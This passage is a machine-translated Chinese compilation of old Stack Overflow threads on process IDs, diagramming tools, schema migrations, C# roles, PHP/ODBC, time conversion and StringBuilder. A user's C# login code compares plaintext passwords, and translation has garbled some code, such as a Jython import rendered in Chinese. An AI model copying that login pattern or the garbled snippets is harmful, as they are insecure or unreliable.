没有“跨平台”的方法可以做到这一点。您必须使用[ctypes](http://www.python.org/doc/2.5.2/lib/module-ctypes.html)为特定版本的 Windows（XP 或 Vista）破解一些东西

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-15T10:35:56.793

我认为如果不使用 /proc 或命令行实用程序，您将无法找到纯粹基于 python 的可移植解决方案，至少在 python 本身中不会。解析 os.system 并不难看——有人必须处理多个平台，无论是你还是其他人。老实说，为您感兴趣的操作系统实现它应该相当容易。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-17T14:21:30.213

没有，恐怕。进程由 pid 而不是名称唯一标识。如果您真的必须按名称查找 pid，那么您将使用您建议的东西，但它不是可移植的，并且可能无法在所有情况下工作。

如果您只需要查找某个应用程序的 pid 并且您可以控制此应用程序，那么我建议更改此应用程序以将其 pid 存储在脚本可以找到它的某个位置的文件中。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-04-07T18:30:37.703

对于 jython，如果使用 Java 5，则可以获取 Java 进程 ID，如下所示：

从 java.lang.management 导入 *
pid = ManagementFactory.getRuntimeMXBean().getName()

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-07-07T07:36:19.537

只需使用：

```
def get_process_by_name(name):
    import re, psutil
    ls = list()
    for p in psutil.process_iter():
        if hasattr(p, 'name'):
            if re.match(".*" + name + ".*", p.name()):
                ls.append(p)
    return ls 
```

# 返回进程对象

# drawing - 在计算机上绘制想法的应用程序

> ID：550654
> 
> 赞同：16
> 
> 时间：2009-02-15T10:24:04.637
> 
> 标签：drawing, diagram, project-planning

我一直想在电脑上而不是在纸上画出我想出的所有想法，但每个人都知道，用老式的笔和纸画草图比用鼠标（甚至更糟，触摸板）。

所以我转向堆栈溢出这个问题：你们中有人知道一个神奇的程序，可以帮助在计算机上以相当的速度绘制图表、想法等吗？

我不追求像 Visio、Dia 等会做漂亮图表的东西（顺便说一句，这需要很长时间才能完成），而是为了快速记下想法和绘制早期工作流线图等

（我知道 - 一个 wacom 板，但用笔记本电脑随身携带它并不可行）

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-02-15T10:53:24.770

我仍然会在手机上使用白板和像样的相机。

通常在白板上工作时，我们经常会在弄清楚问题的真正本质和解决方案之后，经历一个删除所有不重要的东西的阶段。所以我们在 wiki 上放了一些漂亮的图片；）

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-02-15T10:30:45.510

您是否考虑过某种思维导图应用程序？

[PersonalBrain](http://www.thebrain.com)对于这种类型的任务非常方便，即使“图表”功能非常有限。

[替代文字 http://www.thebrain.com/site/personalbrain/learningzone/topUses/awareness3.png](http://www.thebrain.com/site/personalbrain/learningzone/topUses/awareness3.png)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-02-15T10:48:51.037

**我实际上是OneNote**的忠实粉丝。它非常适合输入文本并以视觉方式组织它。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-04-14T15:56:14.090

这不适用于您与其他人一起工作的情况，但我经常使用[GraphViz](http://graphviz.org/)进行头脑风暴。

GraphViz 为您提供绘制图形的`dot`和`neato`语言。所以你开始在你最喜欢的文本编辑器中记下项目和它们之间的关系：

```
graph brainstorm {
  release -- documentation
  release -- "bug fixes"
  release -- enhancements
  documentation -- "release notes"
  documentation -- "user guide"
  enhancements -- "user requests" -- "support team"
  enhancements -- marketing -- demo
} 
```

然后，您可以将其转换为图像：

[整洁图 http://share4pic.com/images/2/9/3/2935067.jpg](http://share4pic.com/images/2/9/3/2935067.jpg)

如果你想美化输出，有很多格式化和布局等选项。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-02-15T11:48:26.603

它不适用于想法或图表，但我发现这非常令人印象深刻：[我喜欢草图](http://www.dgp.toronto.edu/~shbae/ilovesketch.htm)。希望我们将来会看到类似的工具用于其他形式的信息。

当我还在使用 Windows 时，我使用 adobe illustrator 和一个 wacom 表格来绘制图表（[示例](http://www.xs4all.nl/~andrejk/soa-spaghetti.png)）。功能强大，但学习曲线陡峭，如果您只想做草图。

在 linux 上，我使用 Inkscape（带有 wacom 平板电脑）。它没有插画师那么强大，但它可以完成工作。（[示例](http://www.xs4all.nl/~andrejk/innovation.png)）。

我很想使用素描工具来创建演示文稿。在我的屏幕上有许多幻灯片，只需绘制每张纸的内容，还可以使用 wacom 以正确的顺序拖放幻灯片等。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-02-15T13:41:39.060

几年前（90 年代中期）在卡内基梅隆大学有一个名为 SILK（像疯狂的素描界面）的研究项目。两篇讨论这项工作的论文是[*《用户界面设计早期阶段的交互式草图》*](http://www.cs.cmu.edu/~landay/research/publications/SILK_CHI/jal1bdy.html)和[*《就画吧！通过草图故事板编程*](http://www.cs.cmu.edu/~landay/research/publications/storyboard-tr/storyboard.html)。

我认为他们的想法很酷，但这个项目似乎已经被吹走了。我在这里提到它有两个原因：

1.  为了支持提问者的想法，即这对于早期设计阶段来说是一件非常好的事情，并且
2.  希望其他人能比我更幸运地发现 SILK（或至少是原型）发生了什么。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-02-16T13:56:40.000

我知道您“不追求可以制作漂亮图表的东西”。

但是，我相信这个新的基于 web flash 的应用程序**[LovelyCharts](http://my.lovelycharts.com/)**可能会帮助快速（而且也很好）图表，并且可以符合您的目标，即“记下快速的想法和绘制早期的工作流程草图等”。

![http://b.webutation.net/7/7/my.lovelycharts.com.jpg](https://i.stack.imgur.com/y8Re0.jpg)

工作流程草图示例：

![流动草图](https://i.stack.imgur.com/Eidr8.jpg)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-04-14T15:35:59.787

我发现最接近用铅笔或钢笔在纸上书写的感觉是带有 Autodesk 的[SketchBook Pro](http://usa.autodesk.com/adsk/servlet/index?siteID=123112&id=6848450)软件的绘图板（相对便宜且小型的 Wacom Bamboo 就足够了）。

试用一下（如果您手边有数位板，但与鼠标不一样），使用该应用程序进行自然数字绘图的感觉真是太棒了。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-04-26T00:26:42.243

根据您实现某些东西的距离，[balsamiq](http://www.balsamiq.com/)模型可能是您想要的。我发现它非常适合模拟用户界面，而且它可能不是一个开始勾画开发想法的好方法。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2011-07-28T03:43:16.117

[Autodesk Sketchbook Pro](http://usa.autodesk.com/adsk/servlet/pc/index?id=6848332&siteID=123112)是我经过广泛搜索后最接近白板的。最少的控制，但足够了。它的价格也很有吸引力，符合它的简单性。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-02-15T10:38:10.280

也许您应该考虑购买图形输入板。我推荐[Wacom Bamboo](http://www.wacom.com/bambootablet/bamboofun.php)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-03-06T06:40:56.810

我不建议这样做，但是人们提到了思维导图产品甚至 OneNote（*¡sin comentarios！*），所以我将插入我的[TheKBase Desktop](http://thekbase.com)和它的 Cloud 兄弟[TheKBase Web](http://kbaseweb.com)。**不**，它们不会帮助您在纸上绘制东西，但在许多情况下，图表并不是您所需要的。你想组织你的想法并将它们鞭打成形。

如果您坚持绘制图表，[SmartDraw](http://www.smartdraw.com)比 Visio 少 30 倍烦人（对不起西班牙语语法）。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-04-14T16:00:21.630

[Moleskin 的胜利！](http://www.moleskine.co.uk/)

# database - 数据库架构更新

> ID：550662
> 
> 赞同：19
> 
> 时间：2009-02-15T10:29:15.560
> 
> 标签：database, sqlite, migration, air

我正在开发一个使用本地 SQLite 数据库的 AIR 应用程序，并且想知道在分发应用程序的新版本时如何管理数据库模式更新。还考虑跳过某些版本的更新。例如，不是从 1.0 到 1.1，而是从 1.0 到 1.5。

你会推荐什么技术？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2009-02-16T01:13:25.387

对于 SQLite，您可以使用 user_version pragma 来跟踪数据库的版本。获取版本：

```
PRAGMA user_version 
```

设置版本：

```
PRAGMA user_version = 5 
```

然后，我将每组更新保存在一个 SQL 文件中（嵌入在应用程序中）并运行更新到最新版本所需的更新：

```
Select Case currentUserVersion
Case 1
  // Upgrade to version 2
Case 2
  // Upgrade to version 3
Case etc...
End Select 
```

这允许应用程序将自身更新到最新版本，而不管数据库的当前版本如何。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-02-15T12:18:01.023

我们为数据库的每个 DDL 更改编写脚本，当我们进行“发布”时，我们将它们连接成一个“升级”脚本，以及“自上次以来”更改的任何存储过程

我们有一个表格存储最新应用的补丁的版本号——因此升级工具可以应用任何更新的补丁。

每个存储过程都在一个单独的文件中。每个都以“插入”语句开始，该语句存储到存储 SProc 名称、版本和“现在”的日志表。（实际上是执行一个 SProc 来存储它，它不是原始插入语句）。

有时在部署过程中，我们手动更改 SProc，或从 DEV 推出可能性，并比较客户端的 TEST 和 PRODUCTION 数据库上的日志，使我们能够检查所有内容是否处于相同版本。

我们还有一个“发布”主数据库，我们将更新应用到该主数据库，并且我们使用该数据库的恢复备份进行新安装（节省运行脚本的时间，这显然会随着时间的推移而增加）。我们将其更新为 & when，因为显然如果它有点陈旧，则可以应用以后的补丁脚本。

我们的发布数据库还包含经过清理的启动数据（在新安装上线之前，这些数据已被删除，或者有时被采用和修改 - 所以这不包含在任何更新脚本中）

SQL Server 有一个工具栏按钮来编写更改脚本 - 因此您可以使用 GUI 工具进行所有更改，而不是保存它们，而是生成一个脚本。（实际上，有一个复选框**总是会**生成一个脚本，所以如果你忘记了，只需按 SAVE 它仍然会为你提供事后使用的脚本，可以将其保存为补丁文件）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T10:41:10.727

我正在考虑将 SchemaVersion 表添加到数据库中，该表保存每个存在的版本的记录。SchemaVersion 表的最后一个版本是数据库的当前级别。

我将创建 (SQL) 脚本来执行 1.0 的初始设置，然后从 1.0 升级到 1.1、从 1.1 升级到 1.2 等。

即使是全新安装到例如 1.2 也将运行所有这些脚本。这可能看起来有点慢，但只在（几乎）空数据库上完成一次。

这样做的最大优点是全新安装将具有与升级安装相同的数据库架构。

正如我所说：我正在考虑这个。我可能会在明天开始实施。如果你有兴趣，我可以分享我的经验。我将为使用 LINQ-to-entities 与 SQL Server 和 MySQL 作为 DBMSes 的 ac# 应用程序实现此功能。

我很想听听其他人的建议和想法，如果有人可以指出一个开源 .Net 库或实现类似这样的类，那就太好了。

编辑：在[对 SO 上另一个问题](https://stackoverflow.com/questions/534955/best-database-change-control-methodologies)的回答中，我找到了对 Migrator.Net 的引用。我今天开始使用它，它看起来正是我想要的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T10:39:25.987

IMO 最简单的做法是将例如从 1.0 更新到 1.5 的更新视为从 1.0 到 1.1、1.1 到 1.2 等的一系列更新。对于每个版本更改，保留一个转换脚本/一段代码。

然后，在数据库中保留一个带有版本字段的表，并将所需的版本编译到应用程序中。在启动时，如果版本字段与编译的版本不匹配，则一一运行所有需要的转换脚本。

理想情况下，转换脚本应该启动事务并将新版本作为提交事务之前的最后一条语句写入数据库。

# c# - 用户名和角色

> ID：550667
> 
> 赞同：0
> 
> 时间：2009-02-15T10:34:04.770
> 
> 标签：c#, .net, linq-to-sql

我有这个数据库：`table<User>(UserID,Name,Surname,Username,Password,Email)`、`table<Role>(RoleID,RoleName,Description)`和`table<UsersInRole>(UserID,RoleID)`。我使用用户名和密码创建了一个登录身份验证来访问应用程序（使用 Linq ToSql 存储数据），这是正确的。现在我希望为每个用户创建一个角色，但我不知道如何解决；我看到了一些关于它的功能，但它指的是 web.app。

这是适用于登录的过程代码：

```
public partial class Window1 : Window
    {
        public Window1()
        {
            InitializeComponent();
        }

        public bool ValidateApplicationUser(string userName, string password)
        {
          {
                var AuthContext = new DataClasses1DataContext();
                var query = from c in  AuthContext.Users
                            where (c.Username == userName.ToLower() && c.Password == password.ToLower())
                            select c;

                if(query.Count() != 0 )
                {
                    return true;
                }

                return false;
            }

        }

        private void mahhh(object sender, RoutedEventArgs e)
        {
            bool authenticated = true;
            {
                if (usernameTextBox.Text !="" && passwordTextBox.Text != "")
                {
                    authenticated = ValidateApplicationUser(usernameTextBox.Text , passwordTextBox.Text);
                }

            }
            if (!authenticated)
            {
                MessageBox.Show("Invalid login. Try again.");
            }
            else
            {
                MessageBox.Show("Congradulations! You're a valid user!");
                Window3 c = new Window3();
                c.ShowDialog();
                this.Close();
            }
        }
    } 
```

我不知道如何实现为用户分配角色的方法。你有什么想法或建议让它正确吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-15T10:39:58.390

首先，尽量不要在数据库中存储密码；最好存储一个哈希。我不太确定您的意思是“为用户分配角色”-您是否难以从数据库中获取角色？或者您不确定之后如何处理它？如果是后者，“校长”是要走的路；在最简单的级别：

```
 string username = ...
        string[] roles = ...
        Thread.CurrentPrincipal = new GenericPrincipal(
            new GenericIdentity(username), roles); 
```

现在您可以使用基于角色的安全性，无论是声明式的还是命令式的。

声明式：

```
 [PrincipalPermission(SecurityAction.Demand, Role="ADMIN")]
    public void Foo()
    { // validated automatically by the .NET runtime ;-p

    } 
```

至关重要的：

```
 static bool IsInRole(string role)
    {
        IPrincipal principal = Thread.CurrentPrincipal;
        return principal != null && principal.IsInRole(role);
    }
    ...
    bool isAdmin = IsInRole("ADMIN"); 
```

# python - python，字典和int错误

> ID：550673
> 
> 赞同：0
> 
> 时间：2009-02-15T10:37:57.583
> 
> 标签：python, dictionary, global

我有一个非常令人沮丧的python问题。在这段代码中

```
fixedKeyStringInAVar = "SomeKey"

def myFunc(a, b):
    global sleepTime
    global fixedKeyStringInAVar
    varMe=int("15")
    sleepTime[fixedKeyStringInAVar] = varMe*60*1000
    #more code 
```

现在这行得通。但是有时当我运行此功能时，我会得到

```
TypeError: 'int' object does not support item assignment 
```

这非常烦人，因为我尝试了几个测试用例并且无法重现错误，但是当我运行完整代码时它经常发生。该代码从数据库读取数据，访问站点等，因此我很难通过数据，因为它从多个来源读取并取决于更改的第 3 方输入（网站）。

这个错误可能是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T11:12:08.810

1.  `global`除非您想更改全局名称的绑定，否则不要在函数中使用关键字。

2.  `sleepTime =`在您的代码中搜索“ ”。您在程序中的某个位置将一个 int 对象绑定到该`sleepTime`名称。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T10:40:58.077

你的 sleepTime 是一个全局变量。它可以在您的程序中的某个时间点更改为 int。

项目分配是函数中的“foo[bar] = baz”结构。

# php - 使用odbc的php sql

> ID：550678
> 
> 赞同：0
> 
> 时间：2009-02-15T10:40:44.037
> 
> 标签：php, sql, ms-access

嗨，我通过 odbc 在 php 中创建了一个带有 microsoft access 数据库的网站，我遇到了一个小问题，让我先向您展示我的代码。

```
<form method ="POST" action="maxtimestamplog.php">

Longitude <input type="text" name="longitude"  /><br/>
Latitude 
<input type ="text" name = "latitude"/>
<input name="ok" type="submit" value="Submit" />
</form>

<?

$dbc = odbc_connect("X1","","");    // Trying to establish connection
                                            // with database
echo "<br>";

$datetime =date('Y-m-d H:i:s', strtotime('+8 hours'));
echo "The Current date/time is $datetime";
echo "<br><br><br>";

if (!$dbc)
{
    exit("Connection failed:".$dbc);
}
$x_origin = $_POST['longitude'];
$y_origin = $_POST['latitude'];
$query = " SELECT m.vehicle_no, 
l.longitude, 
  l.latitude, 
  l.timestamp
FROM
  vehicle_log AS l,
  GPS_modem   AS m 
WHERE
  m.modem_ID = l.modem_ID
  AND l.timestamp = (
    SELECT MAX(timestamp) FROM vehicle_log WHERE modem_ID = l.modem_ID

  ) order by timestamp desc
";  // SQL Statement

$rs = odbc_exec($dbc,$query);
    if (!$rs)
    {
        exit("Error in SQL. ".$rs);
    }
    $i=1;
while (odbc_fetch_row($rs))
{
    $lng = odbc_result($rs, "longitude");
    $lat = odbc_result ($rs, "latitude");
    $ts = odbc_result ($rs, "timestamp");
    $vno = odbc_result ($rs, "vehicle_no");

    $yyyy= substr($ts, 0, 4);
    $mm= substr($ts, 5, 2);
    $dd= substr($ts, 8,2);
    $hr= substr($ts, 11, 2);
    $min= substr($ts, 14,2);
    $sec= substr($ts,17, 2);
    $cyyyy= substr($datetime, 0, 4);
    $cmm= substr($datetime, 5, 2);
    $cdd= substr($datetime, 8,2);
    $chr= substr($datetime, 11, 2);
    $cmin= substr($datetime, 14,2);
    $csec= substr($datetime,17, 2);

    $ctss = $csec 
                     + ($cmin * 60) 
                     + ($chr * 60 * 60)
                     + ($cdd * 24 * 60 * 60) 
                     + ($cmm * 30 * 24 * 60 * 60) 
                     + ($cyyyy * 365 * 24 * 60 * 60);
    $tss = $sec 
                     + (cmin * 60) + ($hr * 60 * 60) 
                     + ($dd * 24 * 60 * 60) 
                     + ($mm * 30 * 24 * 60 * 60) 
                     + ($yyyy * 365 * 24 * 60 * 60);

    $tssd = $ctss - $tss;

    $x = $lng;
    $y = $lat;
    $i = $i + 1;
    $xd = ($x - $x_origin);
    $yd = ($y - $y_origin);
    $d = ($xd*$xd) + ($yd*$yd);
    $td = sqrt($d);
    echo "Car Number $vno is at a distance $td away at timestamp $ts";
    echo "</br></br>";
}
odbc_close($dbc);
    ?>
</HTML> 
```

我现在要做的是只显示一个输出而不是全部。首先，我只想选择变量 $tssd 小于或等于 10800 的数据，然后我想显示我选择的最小的 $td 并且它应该显示

```
echo "Car Number $vno is at a distance $td away at timestamp $ts";
echo "</br></br>"; 
```

其中 $td 是最小的 $tssd 小于 10800 它应该只显示一个

请尝试帮助我，我对 php 很陌生，我的 sql 语句很混乱，因为我犯了错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T20:35:52.987

尝试将 SQL 与 PHP 分开。

我相信你问的是如何只返回一行而不是所有行。为此，请使用“TOP”关键字。例如，

```
SELECT TOP 1
  m.vehicle_no, 
  l.longitude, 
  l.latitude, 
  l.timestamp 
```

对于您问题的第二部分，“$tssd 中 $td 的最小值小于 10800”，我们不知道这些相关的列名。如果我们假设它们在 vehicle_log 表中被命名为 TD 和 TSSD，那么您的语句可能如下所示：

```
SELECT TOP 1 m.vehicle_no, 
l.longitude, 
  l.latitude, 
  l.timestamp,
  l.TD,
  l.TSSD
FROM
  vehicle_log AS l,
  GPS_modem   AS m 
WHERE
  m.modem_ID = l.modem_ID
  AND l.timestamp = (
    SELECT MAX(timestamp) FROM vehicle_log WHERE modem_ID = l.modem_ID

  )
  AND l.TD <= 10800
  order by l.TD ASC 
```

最后，我更改了 ORDER BY 以适应“我想显示最小的 $td”。

如果这不是您要查找的内容，您能否提供更多信息？

# c++ - 如何将 32 位 int 以 usec 表示时间转换为 32 位 int 以秒为单位的二进制小数表示时间？

> ID：550686
> 
> 赞同：1
> 
> 时间：2009-02-15T10:44:48.830
> 
> 标签：c++, c, embedded

POSIX 用于`struct timeval`表示时间间隔。

```
struct timeval
{
    time_t   tv_sec;
    unsigned tv_usec;
}; 
```

GHS Integrity`Time`以下列方式表示，

```
struct Time
{
    time_t Seconds;
    unsigned Fraction;
}; 
```

例如，0.5sec 表示为`0x80000000`0.25sec 表示为`0x40000000`。

`timeval`从 转换为的最佳方法是`Time`什么？

（ps 答案是不要将 POSIX 库链接到 Integrity 并使用 POSIX 调用。）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T10:48:44.127

这是一种不寻常的表示时间的方式。

无论如何，如果您有 64 位整数或浮点数（前者更可能在嵌入式系统上），则有两种简单的方法可以做到这一点：

```
/* assuming long is 64-bit and int is 32-bit
   or in general long twice the size of int: */
Fraction = (long) tv_usec * UINT_MAX / 1000000        /* usecs to fraction */
tv_usec = (long) Fraction * 1000000 / UINT_MAX        /* fraction to usecs */

/* assuming floating points are available: */
Fraction = tv_usec * ((double) UINT_MAX / 1000000)    /* usecs to fraction */
tv_usec = Fraction * ((double) 1000000 / UINT_MAX)    /* fraction to usecs */ 
```

显然，两者都只是整数近似值，因为一个尺度中的大多数值不能表示为另一个尺度中的整数。在一个方向上，您可能会失去一些精度，因为`Fraction`表格可以表示更精细的时间 -`Fraction`表格的一个增量小于 0.00024 微秒。但这只有在您的计时器实际上可以测量那些不太可能的值时 - 大多数计时器甚至无法以微秒为单位进行测量，并且您看到的值`tv_usec`通常是四舍五入的。

如果 64 位整数和浮点都不是可用的选项，您可以使用额外的变量迭代地执行此操作。我在想是否有一种更简单（并且更便宜，考虑到这是时序代码）的方法来进行这种缩放，而不是使用两个 32 位整数进行等效的迭代 64 位乘法和除法。在我想到的两个想法中，一个不会进行精确的均匀缩放，并且可能会产生最多 9 位的结果，而补偿这一点的一个结果并不便宜。如果我有新的想法，我会在这里发布，但这是一个有趣的挑战。还有其他人有好的算法或片段吗？也许借助一个小的预计算表？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T11:21:20.897

您可能想阅读浮点表示，因为分数似乎是有效数字的第一位。

```
Time t;
u64 s = 1000000 * t.Seconds + 
 u64(1000000 * reinterpret_cast<double>(0x3FF0000000000000|((u64)t.Fraction>>12)))
timeval tv;
tv.tv_sec = s / 1000000
tv.tv_usec = s % 1000000 
```

这是 foobar 但它确实有效......你需要 64 位整数和双浮点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T16:09:17.460

我已经实现[了@Tom Alsberg](https://stackoverflow.com/questions/550686/how-do-i-convert-from-a-32-bit-int-representing-time-in-usec-to-a-32-bit-int-repr/550690#550690)的建议（`double`变体）。有一些警告（比较`frac_t == uint32_t`和的输出`frac_t == uint64_t`）。

```
#include <iomanip>  // setw()
#include <iostream>
#include <limits>

typedef unsigned frac_t;
const frac_t FRACTIONS_PER_SECOND = std::numeric_limits<frac_t>::max();

template <class Uint>
Uint fraction2usec(Uint fraction) {
  return static_cast<Uint>(fraction * 1e6 / FRACTIONS_PER_SECOND + 0.5);
}

template <class Uint>
Uint usec2fraction(Uint usec) {
  return static_cast<Uint>(usec / 1e6 * FRACTIONS_PER_SECOND + 0.5);
}

int main(void) {
  uintmax_t fractions[] = {
    0, 1, 0x10c6, 0x10c6f7a0b5edull,
    static_cast<uintmax_t>(FRACTIONS_PER_SECOND / 2\. + 0.5),
    static_cast<uintmax_t>(FRACTIONS_PER_SECOND / 4\. + 0.5), 
    FRACTIONS_PER_SECOND,
    FRACTIONS_PER_SECOND + 0x1ull,
  };
  const int w1 = 2*sizeof(uintmax_t) , w2 = 10;
  for (size_t i = 0; i < (sizeof(fractions) / sizeof(*fractions)); ++i)
    std::cout << std::hex << std::setw(w1) << fractions[i] << ": " 
          << std::dec << std::setw(w2) << fraction2usec(fractions[i]) 
          << ", "  << std::hex << std::setw(w1) 
          << usec2fraction(fraction2usec(fractions[i])) << "\n";
} 
```

输出（`frac_t == uint32_t`）：

```
 0:          0,                0
           1:          0,                0
        10c6:          1,             10c7
10c6f7a0b5ed: 4294967297,     10c6f7a0b5ee
    80000000:     500000,         80000000
    40000000:     250000,         40000000
    ffffffff:    1000000,         ffffffff
   100000000:    1000000,         ffffffff 
```

输出（`frac_t == uint64_t`）：

```
 0:          0,                0
               1:          0,                0
            10c6:          0,                0
    10c6f7a0b5ed:          1,     10c6f7a0b5ee
8000000000000000:     500000, 8000000000000000
4000000000000000:     250000, 4000000000000000
ffffffffffffffff:    1000000,                0
               0:          0,                0 
```

# c# - 接口的通用实现

> ID：550694
> 
> 赞同：2
> 
> 时间：2009-02-15T10:51:01.997
> 
> 标签：c#, generics, interface

为什么这不起作用？

```
public interface IPoint
{
  // not important
}

public interface IPointList
{
  List<IPoint> Points { get; }
}

public abstract class Point : IPoint
{
  // implemented IPoint
}

public abstract class PointList<TPointType> : IPointList
  where TPointType: IPoint
{
  public abstract List<TPointType> Points { get; } // <- doesn't compile
} 
```

TPointType 显然必须是 IPoint。为什么不允许这种实现？

问候， 凯特

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-15T11:24:08.877

作为对您评论的回答，关于如何两全其美；我正在考虑这样的事情，您可以在其中显式地实现接口 GetPoints 属性，创建“更多类型”的 GetPoints 属性，以及可以在具体实现中覆盖的受保护抽象方法。
2 个属性调用抽象实现。

```
 public abstract class PointList<T> : IPointList where T : IPoint
    {
        public IList<T> GetPoints
        {
            get
            {
                return GetPointsCore ();
            }
        }

        IList<IPoint> IPointList.GetPoints
        {
            get
            {
                return GetPointsCore () as IList<IPoint>;
            }        
        }

        protected abstract IList<T> GetPointsCore();        
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T10:57:41.593

PointList 类*应该*实现 IPointList 接口。方法/属性不能仅因返回类型而异，这是您尝试对 PointList 类中的 Points 声明执行的操作。如果你实施

```
List<TPointType> Points { get; } 
```

那么逻辑上你不能实现

```
List<IPoint> Points { get; } 
```

因为它们仅因返回类型而异。

# .net - 检测asp.net将用户重定向到登录页面

> ID：550698
> 
> 赞同：4
> 
> 时间：2009-02-15T10:53:31.867
> 
> 标签：.net, asp.net, redirect, login

我的网站中有一个目录，该目录受匿名用户保护。我的 web.config 看起来像这样

```
<location path="members">
    <system.web>
        <authorization>
            <allow roles="members" />
            <deny users="*" />
        </authorization>
    </system.web>
</location> 
```

如果匿名用户尝试访问“/members”目录中的页面，他们将被重定向到登录页面。

从登录页面上的代码隐藏中，**有没有办法区分以**这种方式重定向的用户与手动进入登录页面的用户之间的区别？（通过输入网址或单击登录页面的链接）

我知道网络是无状态的，所以这两个请求可能无法区分

如果无法区分两者，有没有办法拦截在.net 由于未经授权的访问尝试而决定重定向用户之前发生的事情？

注意：我不能在查询字符串中使用“ReturnUrl”，因为我会以同样的方式装饰它

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T11:29:19.550

您可以检查“Referrer”[请求标头](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.36)

> 为了服务器的利益，Referer[sic] request-header 字段允许客户端指定获取 Request-URI 的资源的地址 (URI)（“referrer”，尽管头字段拼写错误。）

但是浏览器可能会谎报推荐人。另请看[这篇文章](http://www.asp.net/LEARN/security/tutorial-07-cs.aspx)，它提供了一些关于未经授权的访问的示例，并且它包含完整的描述 asp.net 授权的工作原理。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-16T10:14:52.263

除了检查Referer，您还可以检查“ReturnUrl”属性的查询字符串。这表明 Asp.Net 已经重定向了用户。不过，这又不是 100%。

# asp.net - ASP.net：哪种类型的应用程序/网站更适合 Webform 或 MVC？

> ID：550700
> 
> 赞同：1
> 
> 时间：2009-02-15T10:54:08.340
> 
> 标签：asp.net

我已经阅读了所有关于 ASP.net webform vs mvc 的优缺点的帖子。

但是，我想知道在什么情况下使用 webform 或 mvc？它会归结为您或您的团队更熟悉的东西吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-15T10:59:11.260

具有大量控件的典型业务应用程序，它们的行为规则，以及启用/禁用它们以响应其他控件触发的事件，使用 MVC 将是一个更复杂的任务，而使用 WebForms，您可以在咖啡暂停期间完成它。

此外，使用 MVC，您可以开箱即用地获得对 SEO 友好的 url，这对于公开网站来说非常有用。WebForms 不提供这种便利，但是，对于内部应用程序或受客户登录保护的公共应用程序，根本不用担心。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T12:04:11.447

随着时间的推移，我发现很难将 WebForms（针对 mvc）用于任何新事物。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T12:14:36.133

我的观点是 asp.net webforms 更适合在 Intranet（内部系统）中使用它的应用程序，因为它有一堆控件。如果你实现一个大的应用程序。

Asp.net MVC 适用于使用大量 ajax 并且您需要 SEO 友好 url 的网站。

# .net - 在什么时候使用 StringBuilder 变得微不足道或开销？

> ID：550702
> 
> 赞同：18
> 
> 时间：2009-02-15T10:55:34.797
> 
> 标签：.net, stringbuilder

最近我发现自己对所有大小的字符串连接都使用了 StringBuilder，但是在最近的一次性能测试中，我换掉了同事的*stringOut = string1 + "。" 用于 StringBuilder 的string2*样式连接（在 10000x + 循环中使用，每次都更新 StringBuilder）只是为了看看它在次要连接中会有什么不同。

*我发现，在性能测试的多次运行中，无论连接或 StringBuilder （重申这是针对小*连接），变化都微不足道地更高或更低。

StringBuilder 对象的“更新”在什么时候否定了使用它的好处？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-02-15T11:01:39.787

我遵循的规则是——

如果在编译时连接数未知，请使用 StringBuilder。

因此，在您的情况下，每个 StringBuilder 仅附加几次然后被丢弃。这和类似的东西不一样

```
string s = String.Empty;
for (int i = 0; i < 10000; ++i)
{
    s += "A";
} 
```

使用 StringBuilder 会显着提高性能，因为否则您将不断分配新内存。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2009-02-15T13:19:58.287

我确定我有另一个答案，我只发布了[我的文章的链接](http://www.yoda.arachsys.com/csharp/stringbuilder.html)，然后是它的摘要，但我们又来了。

*   当你在一个非平凡的循环中连接时绝对使用`StringBuilder`- 特别是如果你不确定（在编译时）你将通过循环进行多少次迭代。例如，一次读取文件一个字符，使用 += 运算符构建一个字符串可能会导致性能自杀。

*   当您可以（可读）指定需要在一个语句中连接的所有内容时，请务必使用连接运算符。（如果您有一系列要连接的东西，请考虑`String.Concat`显式调用 - 或者`String.Join`如果您需要分隔符。）

*   不要害怕将文字分成几个连接的位 - 结果是一样的。例如，您可以通过将长文字分成几行来提高可读性，而不会损害性能。

*   如果您需要连接的中间结果而不是提供下一次连接迭代，`StringBuilder`这对您没有帮助。例如，如果您从名字和姓氏构建一个全名，然后在末尾添加第三条信息（可能是昵称），则只有在`StringBuilder`不需要时才能使用(first name + last name) 用于其他目的的字符串（就像我们在创建`Person`对象的示例中所做的那样）。

